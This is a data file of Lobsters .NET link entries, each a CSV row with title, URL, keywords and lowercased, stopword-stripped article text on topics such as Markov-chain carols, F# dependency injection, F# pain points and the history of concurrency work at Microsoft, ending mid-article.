449,Lobsters,dotnet,"C#, F#, .NET programming",A Very Markov Christmas,http://yoloprogramming.com/post/2016/12/23/A-Very-Markov-Christmas,markov christmas,ai wrote christmas song really really creepy markov chain markov chain explained visually andrey markov markovsharp markovsharp markov christmas code available github chris core result mb,post inspired story showed facebook feed recently ai wrote christmas song really really creepy system discussed article neural network topic like dig deeper future article one wanted explore use markov chain produce something sounded christmasy goal learn markov chain find library two help generate one learn enough midi file read existing christmas carol generate new one finally generate christmas lyric feeding markov chain library lyric real christmas carol going want remind reader post blog really author exploring something know little hopefully coming little smarter end process case know markov chain know exist know le never played around beyond know nothing midi file music word markov chain heck markov chain know let start wikipedia open wikipedia scroll bit joking aside looking gentle introduction hit google landed markov chain explained visually fantastic short explanation topic interactive animation strongly recommend checking quick read markov chain named andrey markov mathematical system hop one state situation set value another example made markov chain model baby behavior might include playing eating sleeping cry state together behavior could form state space list possible state addition top state space markov chain tell probability hopping transitioning one state state eg chance baby currently playing fall asleep next five minute without cry first ok given set state markov chain help u predict next state given current state markov help u make better model instance say wanted simple model weather state either sunny rainy naive approach would flip coin randnext decide whether day rainy problem model would tend flip flip rainy nonrainy real life least live rainy day tend clump together model want say today rainy tomorrow likely also rainy transition matrix representation markov chain describe like rainy sunny rainy p rr p r sunny p sr p sr website noted neat animation tool show result playing around transition matrix state diagram pretty neat check screen capture transition diagram inputted tool alright know markov chain good specifically want use markov chain following given note produce next christmasy note given word produce next christmasy word lyric markovsharp armed knowledge set look library help u make markov chain admit given date started december nt think finish christmas given learn markov chain learn midi code assumed christmas post would late retitle markov new year landed markovsharp easy use c implementation nstate markov model markovsharp expose notion model strategy allows use predefined model strategy create scrolled check example found two strategy provided box produce word midi markovsharp pretty easy use box simply provide source material eg list string tell learn provide state transition given current state example training data var line new string frankly dear nt give damn mama always said life like box chocolate never know gon na get many wealthy people little janitor possession create new model var model new stringmarkov train model modellearn line create permutation consolewriteline modelwalk first output frankly dear nt give box possession pretty simple markov christmas project code available github pretty simple chris core library hard work make music find song song directory flattens track get inputted markov model output use different model output division use control song tempo learned via playing around snippet private static int getdivisionfornewmidi list sequence midi var model new stringmarkov modellearn midisselect mdivisiontostring return intparse modelwalk single model trained simply get song getting first output modelgenerating lyric slightly complicated demo code provided library put lyric small handful christmas song pull line output result melody downloaded mb lyric markov christmas come santa claus come tonight dreaming ofmarshmallows toastingand may allthere much mistletoeingplease snow brighttis christmas card writesing joyous alli dreaming white christmas tree christmas card used calland dancer andbrings snowand everyone telling harp mistletoeit new ye lad recalland caroling wonderful time reindeer gamesfor boy vixenhail famous reindeerthe wonderful time together fa laoh peep oh peep indeed reader happy happy holiday
450,Lobsters,dotnet,"C#, F#, .NET programming","Verbatim identifiers (or, why yield return in C# is the way it is)",https://ericlippert.com/2013/09/09/verbatim-identifiers/,verbatim identifier yield return c way,reserved contextual keywords like,c preface identifier keyword symbol make verbatim identifier allows use would normally reserved keywords like identifier need occasionally asked identifier made verbatim identifier restrict verbatim identifier reserved contextual keywords answer straightforward imagine back day c shipped c program us yield identifier entirely reasonable yield common term many business scientific application c carefully designed c program use yield identifier still legal c program special meaning appears return never happened c program still decide going mark usage yield program verbatim identifier clear future reader code used identifier part iterator wish work upgrading entire organization c would bizarre counterproductive made program longer legal c program like like loading related
452,Lobsters,dotnet,"C#, F#, .NET programming",Functional approaches to dependency injection,http://fsharpforfunandprofit.com/posts/dependency-injection-1/,functional approach dependency injection,f advent calendar english said elsewhere reason dependency injection literally wrote book subject decomposing system design methodology usecase dependency injection oo implementation without dependency injection constrained type hidden dependency local method base problem unintentional dependency unneeded interface method general purpose interface segregation principle implementing use case function building function partial application discussion passing dependency inner function refactoring refactoring step logging epicenter refactoring step replacing exception result functional error handling talk refactoring step replacing multiple function parameter one refactoring step replacing two database function one refactoring step passing kleisli composition suave web framework combinators conclusion comment comment powered disqus blog comment powered,post part f advent calendar english project check great post special thanks sergey tihon organizing people learning functional programming technique one common question dependency injection series post address topic said elsewhere helpful try translate oo concept directly fp better instead focus goal rather implementation technique series start reason dependency injection implement classic oostyle dependency injection look three different fporiented approach partial application reader monad interpreter pattern aka free monad partial application covered post reader monad interpreter pattern future post reason dependency injection start talking dependency injection point indebted mark seemann literally wrote book subject misrepresent idea fault mine three common reason using dependency injection first promote information hiding loose coupling concept go back two classic paper david parnas decomposing system design methodology first paper summed design decision likely change create module designed hide decision rest course key principle behind oo principle encapsulating implementation detail object interface see shortly applies equally well fp design second paper summed make information available programmer help make use expose unless really need second support fast unit testing common isolate iorelated operation database filesystem network dependency mocked easily useful even implementation unlikely change thirdly allow independent development two component connected documented interface development safely proceed parallel note second reason important functional programmer reason code like separate pure code mean io course also randomness global state datetimenow mutability ability test mock convenient consequence approach f strictly enforce separation effect pure code way haskell say worthwhile goal nevertheless usecase dependency injection look concrete usecase use basis experiment different implementation say kind web app user user name email preference etc usecase updating profile might something like define user input json object representing request step parse json request domain object representing request read current email address database needed step update profile database email changed send courtesy email message old email notifying changed course need implement stuff well logging auditing profiling include logging oo implementation without dependency injection take usecase two different oo implementation one one without dependency injection first define domain type shared across implementation oo functional type userid int type username string type emailaddress string type updateprofilerequest userid userid name username emailaddress emailaddress going use type alias userid username sophisticated approach would use constrained type instead primitive int string also kind validation either big topic another time first oo version without dependency injection type userprofileupdater member thisupdatecustomerprofile json string try let request thisparserequest json let currentemail dbservicegetemail requestuserid dbserviceupdateprofile requestuserid requestname requestemailaddress loggerinfo updated profile currentemail requestemailaddress loggerinfo sending email changed notification emailservicesendemailchangednotification currentemail requestemailaddress ex loggererror sprintf updatecustomerprofile failed exmessage see hardcoded service dbservice emailservice logger right method good standard oo way fix define interface service inject class constructor interface use type ilogger abstract info string unit abstract error string unit type idbservice abstract getemail userid emailaddress abstract updateprofile userid username emailaddress unit type iemailservice abstract sendemailchangednotification emailaddress emailaddress unit read interface like info take string input return nothing getemail take userid input return emailaddress updateprofile take userid username emailaddress return nothing updated implementation dependency injection type userprofileupdater dbservice idbservice emailservice iemailservice logger ilogger member thisupdatecustomerprofile json string try let request thisparserequest json let currentemail dbservicegetemail requestuserid dbserviceupdateprofile requestuserid requestname requestemailaddress loggerinfo updated profile currentemail requestemailaddress loggerinfo sending email changed notification emailservicesendemailchangednotification currentemail requestemailaddress ex loggererror sprintf updatecustomerprofile failed exmessage member thisparserequest json string updateprofilerequest better service injected class constructor direct dependency service implementation gained benefit loose coupling mockability parallel development promised approach perfect either look issue still remain hidden dependency local method updatecustomerprofile method hidden dependency another method class parserequest one issue oo accidentally take dependency method scope often make refactoring awkward particular accidentally depend method parent class causing base problem unintentional dependency use dependency injection class level mean method class use injected dependency example stop parserequest method using emailservice dependency unlikely say remember maxim make information available programmer help make use experience true cause maintenance nightmare unneeded interface method worse interface naturally tend accumulate new method time become general purpose surprised idbservice soon starting gaining method deletecustomer resetpassword stop updatecustomerprofile calling deletecustomer mistake word failed information hiding one core design principle interface segregation principle reminder often uphill battle finally name class userprofileupdater awkward bit code smell sign business logic fit obvious domain class oh know fix last one rename userprofileupdateservice problem solved one thing order use class need create concrete implementation pas various way typically applicationlevel component responsible creating wiring component service example implementation might something like module compositionroot read config file example let dbconnectionstring serverdbserver databasemydatabase let smtpconnectionstring serveremailserver construct service let dbservice servicesdbservice dbconnectionstring let emailservice servicesemailservice smtpconnectionstring let logger serviceslogger construct class injecting service let customerupdater userprofileupdater dbservice emailservice logger ok quite familiar notice dbservice need dbconnectionstring passed constructor similarly emailservice need smtpconnectionstring look fp approach implementing use case function fp class function rather class constructor function must dependency passed explicitly could copy oo approach pas interface function parameter like let updatecustomerprofile dbservice idbservice emailservice iemailservice logger ilogger json string try let request parserequest json let currentemail dbservicegetemail requestuserid dbserviceupdateprofile requestuserid requestname requestemailaddress etc using interface still problem accidental dependency mentioned better approach break separate dependency standalone function example interface one method would look like type iloginfo abstract loginfo string unit type ilogerror abstract logerror string unit type idbgetemail abstract getemail userid emailaddress type idbupdateprofile abstract updateprofile userid username emailaddress unit type isendemailchangednotification abstract notify emailaddress emailaddress unit course interface one method function type could rewrite type loginfo string unit type logerror string unit type dbgetemail userid emailaddress type dbupdateprofile userid username emailaddress unit type notify emailaddress emailaddress unit notice functional approach dbgetemail dbupdateprofile dbconnectionstring parameter function define needed point view caller need know anything connection string result nothing function mention database db name misleading ok change function use function type rather interface look like module customerupdater let updatecustomerprofile loginfo loginfo logerror logerror getemail dbgetemail updateprofile dbupdateprofile notify notify json string try let request parserequest json let currentemail getemail requestuserid updateprofile requestuserid requestname requestemailaddress loginfo updated profile etc actually need type annotation parameter could equally well write like let updatecustomerprofile loginfo logerror getemail updateprofile notify json try let request parserequest json let currentemail getemail requestuserid updateprofile requestuserid requestname requestemailaddress loginfo updated profile etc however type annotation may useful working topdown know service want ensure compiler error occur within updatecustomerprofile get wrong ok pause analyze version first good thing dependency explicit dependency need function accidentally delete customer example want test easy mock function parameter see soon downside course five extra parameter function look painful course equivalent method oo version also five dependency implicit opinion though pain actually helpful oo style interface natural tendency accrete crud time explicit parameter like natural disincentive many dependency need guideline interface segregation principle much diminished building function partial application look function would created oo design need component responsible setting everything steal oo vocabulary call compositionroot module compositionroot let dbconnectionstring serverdbserver databasemydatabase let smtpconnectionstring serveremailserver let getemail partial application dbservicegetemail dbconnectionstring let updateprofile partial application dbserviceupdateprofile dbconnectionstring let notify partial application emailservicesendemailchangednotification smtpconnectionstring let loginfo loggerinfo let logerror loggererror let parser customerupdaterparserequest let updatecustomerprofile partial application customerupdaterupdatecustomerprofile loginfo logerror getemail updateprofile notify using partial application provide dependency function need familiar partial application see discussion example database function might implemented like explicit connectionstring parameter addition main parameter module dbservice let getemail connectionstring userid userid emailaddress let updateprofile connectionstring userid userid name username emailaddress emailaddress composition root passing dbconnectionstring leaving parameter open let getemail partial application dbservicegetemail dbconnectionstring let updateprofile partial application dbserviceupdateprofile dbconnectionstring resulting function match type need pas main updatecustomerprofile function type dbgetemail userid emailaddress type dbupdateprofile userid username emailaddress unit end module take approach updatecustomerprofile pas five dependency leaving json string parameter open supplied later let updatecustomerprofile partial application customerupdaterupdatecustomerprofile loginfo logerror getemail updateprofile notify mean actually use function need pas json string like let json userid name alice emailaddress new examplecom compositionrootupdatecustomerprofile json way caller need know exactly dependency updatecustomerprofile decoupling wanted course easy test dependency mocked example test check email notification sent database update fails see quickly mock every single dependency test let email change db update fails expect notification email sent arrange let getemail old examplecom let updateprofile deliberately fail failwith update failed let mutable notificationwassent false let notify set flag notificationwassent true let loginfo msg printfn info msg let logerror msg printfn error msg let updatecustomerprofile customerupdaterupdatecustomerprofile loginfo logerror getemail updateprofile notify act let json userid name alice emailaddress new examplecom updatecustomerprofile json assert notificationwassent failwith test failed passing dependency inner function happens inner dependency share parameter main function example say dbservice function need logging function well like module dbservice let getemail connectionstring loginfo logerror userid logging function let updateprofile connectionstring loginfo logerror userid name emailaddress logging function deal take loginfo parameter pas dependency like let updatecustomerprofile loginfo logerror getemail updateprofile notify json try let request parserequest json let currentemail getemail loginfo logerror requestuserid added loginfo logerror updateprofile loginfo logerror requestuserid requestname requestemailaddress added loginfo logerror generally wrong approach dependency getemail concern updatecustomerprofile instead passing new dependency responsibility toplevel composition root module compositionroot let loginfo loggerinfo let logerror loggererror let dbconnectionstring serverdbserver databasemydatabase let smtpconnectionstring serveremailserver let getemail dbservicegetemail dbconnectionstring loginfo logerror pas loginfo logerror let updateprofile dbserviceupdateprofile dbconnectionstring loginfo logerror pas loginfo logerror end result getemail updateprofile exactly broken code depends refactoring updatecustomerprofile function feel ugly though see refactoring make nicer refactoring step logging epicenter first refactoring move logging around responsible logging result action caller callee general think callee inside callee generally information available log also mean called function selfcontained easily composed assume logging function passed service logging module dbservice let getemail connectionstring loginfo logerror userid let updateprofile connectionstring loginfo logerror userid name emailaddress loginfo sprintf profile updated name emailaddress module emailservice let sendemailchangednotification smtpconnectionstring loginfo oldemailaddress newemailaddress loginfo sprintf email sent old new oldemailaddress newemailaddress change main function really need logging let updatecustomerprofile logerror getemail updateprofile notify json try let request parserequest json let currentemail getemail requestuserid updateprofile requestuserid requestname requestemailaddress currentemail requestemailaddress notify currentemail requestemailaddress ex logerror sprintf updatecustomerprofile failed exmessage um except logerror exception handling get rid next section first short digression happens need context higher level say database interface fixed change add logging answer simple wrap dependency logging logic everything set composition root example say updateprofile notify given logging like let updateprofile dbserviceupdateprofile dbconnectionstring logging let notify emailservicesendemailchangednotification smtpconnectionstring logging need create little logging helper function function helper function let withloginfo msg f x loginfo msg f x let updateprofilewithlog updateprofile withloginfo updated profile let notifywithlog notify withloginfo sending email changed notification new function updateprofilewithlog notifywithlog exactly signature original passed updatecustomerprofile original let updatecustomerprofile updatecustomerprofile logerror getemail updateprofilewithlog notifywithlog logging logging simple example course extend idea handle complex scenario refactoring step replacing exception result promised get rid exception handling logic exception handling code using let updatecustomerprofile try ex logerror sprintf updatecustomerprofile failed exmessage well designed catch exception even one probably want failfast due programming error nullreferenceexception replace exception handling logic choice type result see functional error handling talk concept first define result type builtin f hooray type result ok error string need common function map bind module result let map f xresult match xresult ok x ok f x error err error err let bind f xresult match xresult ok x f x error err error err finally minimal computation expression type resultbuilder member thisreturn x ok x member thiszero ok member thisbind xresult f resultbind f xresult let result resultbuilder assuming service return result rather throw exception rewrite updatecustomerprofile inside result computation expression like let parserequest json result updateprofilerequest let updatecustomerprofile getemail updateprofile notify json result unit result let request parserequest json let currentemail getemail requestuserid updateprofile requestuserid requestname requestemailaddress currentemail requestemailaddress notify currentemail requestemailaddress cleaner removed dependency logerror even better refactoring step replacing multiple function parameter one code far passing two logging function loginfo logerror kind annoying since similar see might also need pas even function logdebug logwarn etc way avoid pas function around time one way go back object oriented approach using ilogger interface contains method need alternative approach use data represent choice rather three four different function passed parameter pas one function parameter pas one function value three four different choice see might work practice example original approach using three different function logging let logdebug loginfo logerror three dependency logdebug testing loginfo ok else logerror unexpected could instead define discriminated union case associated function type logmessage debug string info string error string code us logging need one dependency let logger one dependency logger debug testing logger info ok else logger error unexpected implementation logging function match case determine handle message let logger logmessage match logmessage debug msg printfn debug msg info msg printfn info msg error msg printfn error msg use approach everywhere example two separate database function getemail updateprofile could merge one dependency using trick ala case reason return different type getemail return emailaddress updateprofile return unit easily create function encapsulates however way extend oriented approach dependency although make thing bit complex topic upcoming post refactoring step replacing two database function one however give replacing two database function look code see making assumption particular need two call database one fetch old email one update let currentemail getemail requestuserid updateprofile requestuserid requestname requestemailaddres currentemail requestemailaddress perhaps wrong perhaps sql expert write stored procedure one call merge one one way would updateprofile return original email updated let oldemail updateprofile requestuserid requestname requestemailaddress oldemail requestemailaddress notify oldemail requestemailaddress better longer care many sql call needed focusing needed caller introduced subtle coupling updateprofile return email next step business logic requires looked updateprofile isolation obvious designed way going introduce coupling think make explicit think updateprofile return choice either simple update happened need notification email changed notification needed two case captured type type profileupdated nonotificationneeded notificationneeded oldemail emailaddress newemail emailaddress updateprofile function return value type least business logic explicit separated logic implementation type tell u something interest happened say handled could put pattern matching two case directly updatecustomerprofile like let updatecustomerprofile updateprofile notify json result let request parserequest json let updateresult updateprofile requestuserid requestname requestemailaddress match updateresult nonotificationneeded notificationneeded oldemail newemail notify oldemail newemail personally prefer create helper function hide main function linear series call branching let updatecustomerprofile updateprofile handleprofileupdateresult json replaces notify result let request parserequest json let updateresult updateprofile requestuserid requestname requestemailaddress handleprofileupdateresult updateresult implementation helper function let handleprofileupdateresult notify updateresult result match updateresult nonotificationneeded notificationneeded oldemail newemail notify oldemail newemail note handleprofileupdateresult passed updatecustomerprofile parameter replacing notify parameter hardcoded refactoring step passing parserequest one final thing tempted pas parserequest function parameter well like let updatecustomerprofile parserequest updateprofile handleprofileupdateresult json new parameter result let request parserequest json let updateresult updateprofile requestuserid requestname requestemailaddress handleprofileupdateresult updateresult earth would want add extra parameter trying get rid well one reason define parserequest completely different module particular could define updatecustomerprofile defined one way get around linear order f imposes file explicitly reference implementation parserequest parserequest must defined module earlier module updatecustomerprofile defined passing parameter break connection eliminate need special file ordering another reason updatecustomerprofile really care particular implementation parserequest life making parameter enforce final reason want close able chain three function parserequest updateprofile handleprofileupdateresult together directly like let updatecustomerprofile parserequest updateprofile handleprofileupdateresult parserequest updateprofile handleprofileupdateresult kleisli composition operator composes two resultreturning function new resultreturning function function f signature result b function g signature b result c f g new function signature result c using code written far define like let f g f resultbind g thought ability chain function directly even need separate updatecustomerprofile function everything composition root get rid updatecustomerprofile completely final version composition root module various component assembled module compositionroot get configuration let dbconnectionstring serverdbserver databasemydatabase let smtpconnectionstring serveremailserver line component inject dependency using partial application let loginfo loggerinfo let logerror loggererror let getemail dbservicegetemail dbconnectionstring loginfo logerror let updateprofile dbserviceupdateprofile dbconnectionstring loginfo logerror let notify emailservicesendemailchangednotification smtpconnectionstring loginfo logerror let parserequest jsonparsersparserequest create helper function make component fit together smoothly helper variant updateprofile use pipeline let updateprofile request updateprofile requestuserid requestname requestemailaddress helper handle updateresult let handleprofileupdateresult updateresult result match updateresult nonotificationneeded notificationneeded oldemail newemail notify oldemail newemail assemble pipeline let updatecustomerprofile parserequest updateprofile handleprofileupdateresult version compositionroot longer merely place dependency injected place entire pipeline assembled use rest application piece pipeline quite fit together properly little helper function created even rough spot see approach work suave web framework combinators example might see code suave web application look like define route pipeline route let app choose get something somethingelse ok hello post something somethingelse ok thanks posting start app startwebserver defaultconfig app need special userprofileupdater class module longer instead various pipeline assembled right application controller conclusion post little exploration approach decoupling various component make application started updatecustomerprofile method glued together component bit business logic ifthenelse branch implemented oo approach working dependency injecting interface fpsortofequivalent partial application end refactoring eliminated need special function evolved code oriented approach compositionoriented approach using kleisli composition ultimate decoupling standalone function implemented independently glued together various way needed next time happy holiday comment please enable javascript view comment powered disqus blog comment powered
454,Lobsters,dotnet,"C#, F#, .NET programming",PolyConf 16: A brief history of F# / Rachel Reese,https://www.youtube.com/watch?v=cbDjpi727aY,polyconf brief history f rachel reese,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature polyconf brief history f rachel reese youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature polyconf brief history f rachel reese youtube
455,Lobsters,dotnet,"C#, F#, .NET programming",F# pain points,http://www.colinbellmore.work/post/fsharp-pain/,f pain point,array mutability completeness c interop readability type flexibility support adoption diagnosis,throughout long learning process building rebuilding program consistent point trip using f noticeable beginning others became irritating repeated use coming c used avoiding language feature trouble worth hoping f many nasty gotcha moment think show stopper worth mentioning drawback language wellrounded critique honestly still learning addressed way notable speedbumps already rocky adventure learning f array mutability mentioned relied f default immutability ensure passing record around introduce strange chain side effect dependency array mutability break performance interoperability reason great get bit giving extra care working multiple thread array special otherwise share function name immutable collection used without mutating member assignment still pretty explicit special syntax hidden happening deeply nested record mentioned using actor f mailbox processor core component program dispatch split handle transformationvalidation serial input sequential processing loop output conversion fanout happens send message processing actor output actor contains array within deeply nested record sadness since working recent version program deeply nested record technical bug came knowing language well enough thinking threadingsharing problem thought functional language great managing immutability took hour realize misconception implement workaround cloning whole thing would painfully slow since array could grow ten thousand know easily wrap copy write container could avoid overhead ended pushing output logic processing actor message content precomputed without additional overhead f rhetoric gungho easily supporting parallelism minor annoying setback even using async block anywhere else code specifically avoid solve problem thought immutability informed design decision implementation able take full advantage thought might work felt missing one strength language kept using array often needed numeric library call dealing know still treat array usage extra caution need default mutability completeness come mostly ease building quick abstraction refactoring pattern business logic large rest net f core library function option distressing defaultarg argument order switched easier chained application argument order work naturally time signal good design plenty time need swap order argument make piece compose easily requires pretty verbose lambda comparison rest terse language best thought far argument change often go last since make easier partially apply pas around closure often asked restructured problem order argument builtin function natural make wrapper builtin function different argument order knowledge available function pattern magic like second guess consistency availability trying focus problem rudimentary language like go know pull external library nontrivial function f providing much wider breadth tool sometimes struggled decide keep looking component nontrivial work knock probably half dozen common pattern needed build variant core library function know thing wrong common need slightly different nonstandard function assume function created exist name find example realized recreated lens ease unwrapping problem browsing around tool never would known pattern existed sometimes pattern esoteric enough language maintainer probably expect user implement used often enough every application domain might general form pattern could help keeping everything singlepurpose simple major benefit experience wanted something thought would obvious found totally possible nontrivial understand use computation expression time realized building reusable pattern work worth snippet small clear enough see unrelated place keep code simple probably relied copying code would component copying bigger super tough find good tradeoff since yet acquainted level abstraction f provides data exploration graphing noise made f deficiency take long find deedle f charting hardly replacement mpl python panda much familiar panda often get stuck strange workarounds task built deedle clearly heavily adopted expected later anyone seriously using probably written hundred function make comparable r advantage f clear type goodness went away every key string working data frame rarely produced fewer runtime error run noticeably faster python scale data using biggest thing noticed lack easy join alignment data different sample interval preference c compatibility firstclass f experience surprised disappointment nonetheless task used csv type provider since interfacing deedle worth leveraging something really powerful opposite problem panda tends sneak even quite needed powerful convenient c interop ink f doc spilled oo feature c interop never painless experience using c code f never even tried going way calling another language f term project management tooling story much better hosted language term language feature compatibility f like kotlin support unit measure biggest pain since requires lot manual conversionchecking boundary compromise integrity feature next exception null thing f throw return working rare c code qualm throwing exception error null return value make working f immediately painful f code throw generally try version return option instead avoiding f exception thrower think big first step focusing le happy code path exception often gloss additional handling code finding often catching broader situation meant handle putting assumption type system great eventually work unwind properly well tedious encoding first place also place yet f style interface obvious tryparse method collection aggregation function throwing empty collection made work rather language consistent inconsistency hurt anticipating term working rest c net ecosystem seems like f always catch fix mode either v net system change roll c vbnet f catch support later f lead way feature fall behind net runtime modified specifically support feature c c much bigger f feel like roll f concern never c making compromise large library working f always f need crazy workarounds good c interop underdog mentality pervasive number unmaintained project seems like primary goal provide suitable f experience dominant c tool know scala clojure groovy community deal stepchild problem f close relationship microsoft put better position maintained party readability f code need interop c code c python devs logic come quite nicely relatively clean composition seen reader often get lost bind map pattern match attention level drop try explain mean come back real logic hand easy mix functional composition style rest business code first putting system together since ease composition often informed closely logic related find terse version routing logic mixed conceptually clear grasp supporting syntax code come across worst kind magic noise nonprogrammers see look code tough tradeoff abstracting adding function name thing often make le clear whole since end creating nonsensical specific name general transformation composition step separate considered base case computation final logic often trivial math routing data management expressed via function composition get tricky part even attempting review code outside ide pain since heavily relying intellisense type compilation one hand great type make appearance nonprogrammers looking code since abstracted correctly read better best written c problem technical question arise around type usage answer without compiler check valid everywhere ability look code context mentally compile within scope speak simpler language standard oo encapsulation heavily trumpeting importance readability understandability find f code lose reading verbose python code fewer special character hidden parameter passing result abuselove pattern matching standard using try function like power simplicity without compromising either think better understand appeal gradual static type system like dart typescript provide benefit downside full type inference huge boon provides many benefit downside detriment without right tool type flexibility first getting ml functional programming literature heard many statement effect get compile probably right experience previous program nonml language nothing could truth long time since fight c compiler implementation compile c code right first pas f code grew statically typed language always thought solution term type never fought f compiler prove correctness time would catch sloppy code finished typing rare would catch something useful incomplete pattern match type system easy enough use could catch bug like control flow deadends misplaced usage would require exhaustive test suite dynamic language catch quick turnaround find type error without test big productivity boost many logic bug python able encode type system bug often sinister since appear right thing meet type precondition hit error path area later like dynamic language f bug manifest strange program behavior around collection instead type attribute error always tracking simple error time spent debugging type situation type error dynamic language failure localized least directly traceable call stack instead hunting watching function manipulates collection pushing everything inside value make program robust provide opportunity explicitly handle error generally underestimated tough writing good error handling code comparison le strict environment even good type system great high level sketch piece provide enforceable interface lowest level dealing primitive greatly limited much like safety net lack higher kind structural polymorphism felt like hindrance trying quickly concisely string together piece system fell pattern biased generic usage instead always focused specific case hand well versed enough raw power c template often jarred limited type system could code would qualify metaprogramming friendly tried using code quotation type provider yet expecting write much singlepurpose code type constraint reason data collection lingua franca f far work make good generic type play well existing function feel like commentary oo since problem reversed hard make good data collection everything made abstract get wrong love strong inferred static type system everything else brings table tooling performance silver bullet effort learning pay expected exception unit measure never really able leverage type system prevent problem normally encountered language support adoption scientific domain f small potato compared python c every analytical process needed readily available python cc equivalent net ecosystem developed way open source ecosystem numerical method data science sad day find multiple julia implementation filtering algorithm need freely available net code even commercial tool much better even bumped quite bit scientific net code admitted poor fortran port even argument quality v quantity mass people producing integratable component f net domain language ongoing work front think f far better suited work c would also long way go could since project term general language trajectory f appears going nowhere particular best tool particular niche trying tackle general purpose programming problem far betterentrenched alternative killer app language library framework company push adoption language prominence f yet plenty f project good port language good framework nothing would deciding factor among many upcoming functional programming language momentum f make many compromise many different area afraid always treated best tool job clear advantage c community support fragmented small enough spoiled bad apple much smaller language term adoption much vibrant passionate community since f inherits c community attitude conservative clear people investigating toy learn solution problem language might internally move pretty fast stable community kinda sluggish based culture still optimistic language microsoft behind might great applicability future cloudscale process parallelism diagnosis problem f language mostly symptom language small mindshare misconception functional language still learning best use type system set expectation net ecosystem specific syntax design quibble language try keep abreast new feature suggestion specific upcoming language feature excited eagerly anticipating rapid infrastructure change net ecosystem might address problem support adoption still willing move forward project learned sunk cost also found better language way think thing want working language constantly thinking much easier cleaner would could f current language idiom experience far taught introspective honest capability expectation learning f impetus changing way think programming business profession crazy needed get far think next step going passing
456,Lobsters,dotnet,"C#, F#, .NET programming",15 Years of Concurrency,http://joeduffyblog.com/2016/11/30/15-years-of-concurrency/,year concurrency,tale three safety midori background clr team niche beginning numa concurrency right static analysis wrote book cilk nesl connection machine mimd von neumann symmetric multiprocessor smp free lunch enter multicore moore law imminent demise power wall challenge seriously curtail everincreasing yearoveryear clock speed improvement free lunch article wintel era andy bill law multicore manycore architecture dsp gpus blown way past number fpga offloading critical task like encryption compression innovator dilemma making concurrency easier software transactional memory software transactional memory herlihy moss seminal paper orelse dangerous thing give people transactional synchronization extension tsx speculative lock elision parallel language integrated query plinq language integrated query linq parallel database parallelized sql query user behalf list comprehension haskell apl lengthy history academia openmp mapreduce dryadlinq cosmos jim gray interlude forming pfx team pfx barrierstyle synchronization concurrent lockfree collection many great research paper task parallel library make improvement year work stealing scheduler apis code almost identical shoutout inspiration java concurrent programming java jsr jsr forkjoin sought emulate safety art thou hello midori axum architecture idea hoare csps actor e π erlang concurrency coordination runtime ccr cω join com apartment orleans tpl dataflow akkanet e concept vat shared nothing eventloop concurrency asynchronous everything stop exchange heap model permission subtyping relationship verification ownership ambient authority ambient authority capabilitybased security referential transparency novel compiler optimization leading reduction code size across entire o along associated speed improvement leaky construction partially constructed object invoke virtuals constructor formalism permission lattice oopsla msr tech report substitution variance scary yet subtle security problem year due type system gotchas enabled safe concurrency automatic parallelism active proposal sideeffects ownership memory important concept dnn sequential consistency tearfree code sequential consistency sc realizing popular technique fundamentally flawed struct tearing without typesafety threatening race message passing race understood perhaps widely time check time use toctou reentrancy evolution inspiration const correct alias analysis alias analysis linear type linear type change world linear logic jy girard find example haskell monad haskell haskell state monad sugar make certain aspect look imperative monad state haskell paper effect type effect typing ownership annotation region region deterministic parallel java cyclone separation logic separation logic concurrent form view uniqueness type uniqueness type clean experimental work bring uniqueness scala model checking model checking msr zing language dozen influential concurrent parallel language modern c thought topic go routine share memory communicating torn structs interface rpc system rust rust article give great whirlwind tour epilogue conclusion oopsla paper buffer error remain attack type,tale three safety discussed three kind safety type memory concurrency followon article dive deeper last perhaps novel yet difficult one concurrencysafety led midori project first place spent year net c concurrency model leading joining built great thing proud time perhaps broadly interesting however reflection experience year away project tried write article time since earlier year thrilled finally share hope useful anyone interested field especially anybody actively innovating area although code sample lesson learned deeply rooted c net midori project tried generalize idea easily consumable regardless programming language hope enjoy background job figuring get concurrency hand developer starting relatively niche job clr team microsoft niche beginning back largely entailed building better version classic threading locking synchronization primitive along attempt solidify best practice example introduced threadpool net used experience improve scalability window kernel scheduler threadpool crazy numa machine kept u busy sort esoteric performance challenge developed rule concurrency right lock leveling experimented static analysis even wrote book concurrency first place short enormously challenging technicallyspeaking therefore boatload fun always language wonk naturally fascinated decade deep work academia including programming language runtime symbiosis especially cilk nesl advanced type system even specialized parallel hardware architecture especially radical one like connection machine mimd supercomputer innovated beyond trustworthy pal von neumann although large customer actually ran symmetric multiprocessor smp server yes actually used call say concurrency popular area specialize certainly mention cool researchy source would gotten odd glance peer manager nevertheless kept despite fun say work period immensely impactful casual observer raised abstraction little bit developer could schedule logical work item think higher level synchronization nothing gamechanging nonetheless period instrumental laying foundation technically socially come later although know time free lunch enter multicore something big happened intel amd approached u moore law notably imminent demise power wall challenge would seriously curtail everincreasing yearoveryear clock speed improvement industry grown accustomed suddenly management cared whole lot concurrency herb sutter free lunch article captured fever pitch enable developer write massively parallel software something historically difficult unlikely happen without significantly lower barrier entry microsoft intel business mutually beneficial business model trouble hardware get faster usual way software automatically get better people would le reason buy new hardware software end wintel era andy bill law andy giveth bill taketh away thinking went term multicore broke mainstream began envisioning world core processor even forwardlooking manycore architecture took page dsps mixing general purpose core specialized one could offload heavyduty function like encryption compression like aside year hindsight thing unfold exactly thought would run pc traditional core although gpus blown way past number see heterogeneity ever especially data center fpgas offloading critical task like encryption compression real big miss opinion mobile precisely thinking around power curve density heterogeneity told u mobile imminent big way instead looking beefier pc looking pc pocket instead natural instinct cling past save pc business classical innovator dilemma although sure seem like one time course pc die overnight innovation wasted feel imbalanced backdrop history anyway digress making concurrency easier concurrency geek moment waiting almost overnight finding sponsor innovative work dreaming got lot easier real urgent business need short needed make easier write parallel code make easier avoid concurrency pitfall make thing happen almost accident already thread threadpools lock basic event go three specific project hatched around point got infusion interest staffing software transactional memory ironically began safety first foreshadows later story general safety took serious backseat able pick back context midori developer already several mechanism introducing concurrency yet struggled write correct code sought higher level abstraction could enable correctness accident enter software transactional memory stm outpouring promising research coming year since herlihy moss seminal paper although panacea number u became enamored ability raise abstraction level stm let write thing like get automatic safety void transfer account account int amt atomic fromwithdraw amt todeposit amt look lock stm could handle decision transparently like figuring coarse finegrained synchronization use contention policy around synchronization deadlock detection prevention guarantee forget lock accessing shared data structure behind tantalizingly simple keyword atomic stm also came simple declarative coordination mechanism like orelse although focus eliminating need manually manage locking also helped evolve synchronization thread unfortunately year prototyping deep runtime 